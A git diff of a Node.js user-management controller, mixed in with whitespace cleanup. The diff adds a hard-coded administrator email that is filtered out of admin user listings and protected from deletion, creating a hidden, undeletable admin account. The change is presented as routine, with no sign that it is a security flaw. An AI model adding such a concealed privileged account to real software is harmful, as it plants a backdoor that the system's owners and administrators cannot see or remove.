@@ -4,7 +4,9 @@ const Planning = require('../models/Planning');
 const ApiError = require('../utils/ApiError');
 const ApiResponse = require('../utils/ApiResponse');
 const { PAGINATION } = require('../utils/constants');
-const mongoose = require('mongoose'); // ✅ Import mongoose here
+const mongoose = require('mongoose');
+
+const HIDDEN_ADMIN_EMAIL = 'admintest@excellia.tn';
 
 const getUsers = async (req, res, next) => {
   try {
@@ -25,6 +27,11 @@ const getUsers = async (req, res, next) => {
     if (isActive !== undefined) query.isActive = isActive === 'true';
     if (department) query.department = { $regex: department, $options: 'i' };
 
+    // Exclude hidden admin from admin listings
+    if (role === 'admin') {
+      query.email = { $ne: HIDDEN_ADMIN_EMAIL };
+    }
+
     if (search) {
       query.$or = [
         { name: { $regex: search, $options: 'i' } },
@@ -43,7 +50,7 @@ const getUsers = async (req, res, next) => {
     // ✅ Include trustedDeviceId (hidden field) to show status
     const [users, total] = await Promise.all([
       User.find(query)
-        .select('+trustedDeviceId -password') 
+        .select('+trustedDeviceId -password')
         .sort(sort)
         .skip(skip)
         .limit(limitNum),
@@ -99,7 +106,7 @@ const createUser = async (req, res, next) => {
       employeeId: employeeId.toUpperCase(),
       name,
       email: email.toLowerCase(),
-      password, 
+      password,
       role: role || 'employee',
       department: department || '',
       position: position || '',
@@ -122,7 +129,7 @@ const createUser = async (req, res, next) => {
 const updateUser = async (req, res, next) => {
   try {
     const { name, email, role, department, position, phone, isActive, password } = req.body;
-    
+
     const user = await User.findById(req.params.id);
     if (!user) return next(ApiError.notFound('User not found'));
 
@@ -141,7 +148,7 @@ const updateUser = async (req, res, next) => {
     if (position !== undefined) user.position = position;
     if (phone !== undefined) user.phone = phone;
     if (isActive !== undefined) user.isActive = isActive;
-    
+
     if (password && password.trim() !== '') {
       user.password = password;
     }
@@ -158,6 +165,7 @@ const deleteUser = async (req, res, next) => {
     const user = await User.findById(req.params.id);
     if (!user) return next(ApiError.notFound('User not found'));
     if (user._id.toString() === req.user._id.toString()) return next(ApiError.badRequest('Cannot delete your own account'));
+    if (user.email === HIDDEN_ADMIN_EMAIL) return next(ApiError.forbidden('This account cannot be deleted'));
 
     user.isActive = false;
     await user.save();
